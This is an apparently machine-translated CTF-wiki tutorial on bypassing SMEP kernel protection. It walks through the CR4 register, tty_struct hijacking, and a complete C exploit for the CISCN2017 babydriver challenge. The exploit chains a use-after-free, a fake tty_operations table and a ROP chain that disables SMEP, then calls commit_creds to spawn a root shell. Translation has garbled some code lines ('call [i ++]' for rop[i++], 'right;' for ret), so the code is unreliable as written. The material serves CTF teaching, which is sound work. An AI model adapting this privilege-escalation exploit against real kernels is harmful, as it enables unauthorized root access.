[EN](./bypass_smep.md) | [ZH](./bypass_smep-zh.md)
# bypass-smep

## SMEP
In order to prevent the `ret2usr` attack, the kernel developer proposed `smep` protection, smep full name `Supervisor Mode Execution Protection`, which is a protection measure of the kernel. When the CPU is in `ring0` mode, it performs `user space&#39;. Code` will trigger a page fault; this protection is called `PXN` in arm.


The option when starting the kernel with qemu can determine whether smep protection is enabled.
```bash

CISCN2017_babydriver [master ●●] grab smep ./boot.sh
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep

```



Can also pass
```bash

CISCN2017_babydriver [master ●●] grep smep / proc / cpuinfo
flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap intel_pt xsaveopt dtherm ida arat pln pts

......

```

Check if the protection is turned on.


### smep and CR4 registers
The system judges whether to enable smep protection according to the value of the CR4 register. When the 20th bit of the CR4 register is 1, the protection is turned on; when it is 0, the protection is turned off.


![](http://ww1.sinaimg.cn/large/006AWYXBly1fvzmqcu1irj30py06egmo.jpg)



For example, when
```

$ CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000
```

When smep protection is turned on. The CR4 register can be modified by the mov instruction, so only the need is needed.
`` `asm
mov cr4, 0x1407e0

# 0x1407e0 = 101 0 0000 0011 1111 00000

```

You can turn off smep protection.


Searching for the gadget extracted from `vmlinux` is easy to achieve.


- How do I check the value of the CR4 register?
- gdb cannot view the value of the cr4 register and can be viewed by the information when the kernel crashes. In order to turn off smep protection, a fixed value of `0x6f0`, ie `mov cr4, 0x6f0`, is commonly used.


### CISCN2017 - baby driver
I have previously analyzed the use of [uaf to change cred] (https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf/#ciscn2017-babydriver), this time, another way, Elevate by closing smep protection and ret2usr.


The method chosen here is to first control a `tty_struct` structure through uaf, and assign such a structure when `open(&quot;/dev/ptmx&quot;, O_RDWR)`


The [source] of `tty_struct` (https://code.woboq.org/linux/linux/include/linux/tty.h.html#tty_struct) is as follows:
```C

struct tty_struct {

	int	magic;

	struct kref kref;

	struct device *dev;

	struct tty_driver *driver;

	const struct tty_operations *ops;

	int index;

	/* Protects ldisc changes: Lock tty not pty */

	struct ld_semaphore ldisc_sem;

	struct tty_ldisc *ldisc;

	struct mutex atomic_write_lock;

	struct mutex legacy_mutex;

	struct mutex throttle_mutex;

	struct rw_semaphore termios_rwsem;

	struct mutex winsize_mutex;

	spinlock_t ctrl_lock;

	spinlock_t flow_lock;

	/* Termios values are protected by the termios rwsem */

	struct ktermios termios, termios_locked;

	struct termiox *termiox;	/* May be NULL for unsupported */

	char name[64];

	struct pid *pgrp;		/* Protected by ctrl lock */

	struct pid *session;

	unsigned long flags;

	int count;

	struct winsize winsize;		/* winsize_mutex */

	unsigned long stopped:1,	/* flow_lock */

		      flow_stopped:1,

		      unused:BITS_PER_LONG - 2;

	int hw_stopped;

	unsigned long ctrl_status:8,	/* ctrl_lock */

		      packet:1,

		      unused_ctrl:BITS_PER_LONG - 9;

	unsigned int receive_room;	/* Bytes free for queue */

	int flow_change;

	struct tty_struct *link;

	struct fasync_struct *fasync;

	wait_queue_head_t write_wait;

	wait_queue_head_t read_wait;

	struct work_struct hangup_work;

	void *disc_data;

	void *driver_data;

	spinlock_t files_lock;		/* protects tty_files list */

	struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

	int closing;

	unsigned char *write_buf;

	int write_cnt;

	/* If the tty has a pending do_SAK, queue it here - akpm */

	struct work_struct SAK_work;

	struct tty_port *port;

} __randomize_layout;

```



Why should we control this structure? Because there is another interesting structure `tty_operations`, [source] (https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations) is as follows:
```C

struct tty_operations {

	struct tty_struct * (*lookup)(struct tty_driver *driver,

			struct file *filp, int idx);

	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);

	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);

	int  (*open)(struct tty_struct * tty, struct file * filp);

	void (*close)(struct tty_struct * tty, struct file * filp);

	void (*shutdown)(struct tty_struct *tty);

	void (*cleanup)(struct tty_struct *tty);

	int  (*write)(struct tty_struct * tty,

		      const unsigned char *buf, int count);

	int  (*put_char)(struct tty_struct *tty, unsigned char ch);

	void (*flush_chars)(struct tty_struct *tty);

	int  (*write_room)(struct tty_struct *tty);

	int  (*chars_in_buffer)(struct tty_struct *tty);

	int  (*ioctl)(struct tty_struct *tty,

		    unsigned int cmd, unsigned long arg);

	long (*compat_ioctl)(struct tty_struct *tty,

			     unsigned int cmd, unsigned long arg);

	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);

	void (*throttle)(struct tty_struct * tty);

	void (*unthrottle)(struct tty_struct * tty);

	void (*stop)(struct tty_struct *tty);

	void (*start)(struct tty_struct *tty);

	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);

	void (*flush_buffer)(struct tty_struct *tty);

	void (*set_ldisc)(struct tty_struct *tty);

	void (*wait_until_sent)(struct tty_struct *tty, int timeout);

	void (*send_xchar)(struct tty_struct *tty, char ch);

	int (*tiocmget)(struct tty_struct *tty);

	int (*tiocmset)(struct tty_struct *tty,

			unsigned int set, unsigned int clear);

	int (*resize)(struct tty_struct *tty, struct winsize *ws);

	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);

	int (*get_icount)(struct tty_struct *tty,

				struct serial_icounter_struct *icount);

	void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);

#ifdef CONFIG_CONSOLE_POLL

	int (*poll_init)(struct tty_driver *driver, int line, char *options);

	int (*poll_get_char)(struct tty_driver *driver, int line);

	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);

#endif
	int (*proc_show)(struct seq_file *, void *);

} __randomize_layout;

```



A lot of function pointers (pwn hand feng shui treasure), so I imagine constructing the structure shown in the figure below
```

fake_tty_struct  fake_tty_operations

+---------+      +----------+

|magic    |  +-->|evil 1    |

+---------+  |   +----------+

|......   |  |   |evil 2    |

|......   |  |   +----------+

+---------+  |   |evil 3    |

|*ops     |--+   +----------+

+---------+      |evil 4    |

|......   |      +----------+

|......   |      |......    |

+---------+      +----------+

```

Then we can jump to different evils through different operations (such as `write, ioctl`, etc.).


For this topic, because smep protection is enabled, if you want ret2usr to increase the weight, you need to modify the value of cr4, and the control function pointer is not enough. You can control the function pointer to perform the stack pivot and other operations to our rop chain. Space, close smep with rop, and then proceed.


&gt; This question is not given to vmlinux. You need to extract the kernel image using [extract-vmlinux] (https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux).


After turning off smep protection, you can use rop to do whatever you want. The final [exp](https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/uaf_tty_struct.c) is as follows:
```C

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

#include <string.h>

#include <sys/types.h>

#include <sys/stat.h>

#include <fcntl.h>



#define prepare_kernel_cred_addr 0xffffffff810a1810

#define commit_creds_addr 0xffffffff810a1420



void* fake_tty_operations[30];



size_t user_cs, user_ss, user_rflags, user_sp;

void save_status()

{

	__asm__("mov user_cs, cs;"

			"mov user_ss, ss;"

			"mov user_sp, rsp;"

&quot;pushf;&quot;
			"pop user_rflags;"

			);

	puts("[*]status has been saved.");

}





void get_shell()

{

    system("/bin/sh");

}



void get_root()

{

    char* (*pkc)(int) = prepare_kernel_cred_addr;

    void (*cc)(char*) = commit_creds_addr;

(* cc) ((* pkc) (0));
}

int main()

{

    save_status();



	int i = 0;

    size_t rop[32] = {0};

call [i ++] = 0xffffffff810d238d; // pop rdi; right;
call [i ++] = 0x6f0;
call [i ++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; right;
call [i ++] = 0;
    rop[i++] = (size_t)get_root;

call [i ++] = 0xffffffff81063694; // swapgs; pop rbp; right;
call [i ++] = 0;
call [i ++] = 0xffffffff814e35ef; // iretq; right;
    rop[i++] = (size_t)get_shell;

    rop[i++] = user_cs;                /* saved CS */

    rop[i++] = user_rflags;            /* saved EFLAGS */

    rop[i++] = user_sp;

    rop[i++] = user_ss;



	for(int i = 0; i < 30; i++)

	{

		fake_tty_operations[i] = 0xFFFFFFFF8181BFC5; 

	}

    fake_tty_operations[0] = 0xffffffff810635f5;  //pop rax; pop rbp; ret;

    fake_tty_operations[1] = (size_t)rop;

    fake_tty_operations[3] = 0xFFFFFFFF8181BFC5;  // mov rsp,rax ; dec ebx ; ret



    int fd1 = open("/dev/babydev", O_RDWR);

    int fd2 = open("/dev/babydev", O_RDWR);

    ioctl(fd1, 0x10001, 0x2e0);

    close(fd1);



    int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);

    size_t fake_tty_struct[4] = {0};

    read(fd2, fake_tty_struct, 32);

    fake_tty_struct[3] = (size_t)fake_tty_operations;

    write(fd2,fake_tty_struct, 32);



    char buf[0x8] = {0};

    write(fd_tty, buf, 8);



    return 0;

}

```
